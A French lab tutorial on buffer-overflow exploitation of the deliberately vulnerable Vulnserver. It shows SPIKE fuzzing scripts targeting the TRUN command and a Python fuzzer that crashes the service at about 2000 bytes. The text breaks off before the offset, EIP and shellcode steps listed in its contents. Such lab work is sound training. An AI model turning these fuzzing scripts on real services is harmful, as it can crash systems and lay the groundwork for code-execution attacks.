# TP Buffer Overflow Ethical Hacking

Dans ce TP, nous allons voir comment exploiter une faille de type buffer overflow pour prendre le contrôle d'un programme. Nous allons utiliser un programme vulnérable que nous allons exploiter pour exécuter du code arbitraire.

1. [Setup](#setup)
2. [Spiking (trouver la vulnérabilité)](#spiking)
3. [Fuzzing (créer un PoC)](#fuzzing)
4. [Chercher l'offset](#offset)
5. [Overwrite EIP](#eip)
6. [Trouver un espace mémoire exécutable](#memory)
7. [Shellcode](#shellcode)

## 1. Setup <a name="setup"></a>

On installe un certain nombre d'éléments sur la machine victime. 
Premièrement, Vulnserver, qu'on fera écouter sur le port 9999.  
[vulnserver](https://github.com/stephenbradshaw/vulnserver)  

Ensuite, on installe Immunity Debugger sur la machine attaquée.  
[Immunity Debugger](https://www.immunityinc.com/)

Cela fait, on démarre une kali sur laquelle tout se passera.

## 2. Spiking (trouver la vulnérabilité) <a name="spiking"></a>

On va commencer par chercher la vulnérablilité dans le programme. Pour cela, on va utiliser le script `generic_send_tcp` fourni dans kali.

```spk 
fichier stats.spk


s_readline();
s_string("STATS");
s_string_variable("0");
```

on envoie:

```bash
generic_send_tcp ip_windows 9999 stats.spk 0 0
```


[fuzzing avec STATS](assets/1.png)


On voit que le programme ne crash pas, essayons de modifier la commande.

```spk
fichier stats.spk

s_readline();
s_string("TRUN ");
s_string_variable("0");
```

```bash
generic_send_tcp ip_windows 9999 stats.spk 0 0
```

Parfait ! On s'aperçoit que le programme crashe. On a donc trouvé la vulnérabilité.

[Programme crash](assets/2.png)

## 3. Fuzzing (créer un PoC) <a name="fuzzing"></a>

On va donc exploiter la faille déterminée précédemment. On va commencer par créer un script qui nous permettra de déterminer à combien de bytes le fuzzing a crash.

```py

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('10.0.2.15',9999))
		
		payload = "TRUN /.:/" + buffer

		s.send((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100

	except:
		print("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()

```

On lance le script et on attend que le programme crash.  
Ici, on voit que le programme crash à 2000 bytes.  

[Programme crash à 2000 bytes](assets/3.png)

